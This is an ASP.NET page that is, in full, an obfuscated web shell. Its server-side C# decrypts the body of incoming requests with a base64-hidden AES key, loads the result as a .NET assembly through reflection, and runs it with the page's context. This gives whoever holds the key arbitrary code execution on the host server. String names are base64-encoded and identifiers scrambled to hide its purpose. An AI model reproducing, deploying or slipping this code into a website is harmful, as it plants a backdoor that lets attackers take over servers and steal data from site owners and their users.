<%@ Page Language="C#" %><script runat="server">
void Page_Load(object sender, EventArgs e) {
    if (Request.Cookies.Count > 0) {
        p_8a1f(this);
    }
}

string d_3b2c(string s_str) {
    return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(s_str));
}

void p_8a1f(System.Web.UI.Page ctx_page) {
    var s_c4d5 = ctx_page.Request.InputStream;
    byte[] b_e6f7 = new byte[s_c4d5.Length];
    s_c4d5.Read(b_e6f7, 0, b_e6f7.Length);
    
    var k_g8h9 = System.Text.Encoding.Default.GetBytes(d_3b2c("Y2E2MzQ1NzUzOGI5YjFlMA=="));
    var rm_i0j1 = (System.Security.Cryptography.SymmetricAlgorithm)System.Activator.CreateInstance(System.Type.GetType(d_3b2c("U3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SaWpuZGFlbE1hbmFnZWQ=")));
    
    var d_k2l3 = rm_i0j1.CreateDecryptor(k_g8h9, k_g8h9);
    byte[] a_m4n5 = d_k2l3.TransformFinalBlock(b_e6f7, 0, b_e6f7.Length);

    var asm_o6p7_type = System.Type.GetType(d_3b2c("U3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHk="));
    var m_q8r9_load = asm_o6p7_type.GetMethod(d_3b2c("TG9hZA=="), new System.Type[]{typeof(byte[])});
    var loaded_s0t1_asm = m_q8r9_load.Invoke(null, new object[]{ a_m4n5 });

    var m_u2v3_create = loaded_s0t1_asm.GetType().GetMethod(d_3b2c("Q3JlYXRlSW5zdGFuY2U="), new System.Type[]{typeof(string)});
    var i_w4x5_inst = m_u2v3_create.Invoke(loaded_s0t1_asm, new object[]{ d_3b2c("Sw==") });

    var m_y6z7_equals = i_w4x5_inst.GetType().GetMethod(d_3b2c("RXF1YWxz"), new System.Type[]{typeof(object)});
    m_y6z7_equals.Invoke(i_w4x5_inst, new object[]{ ctx_page });
}
</script>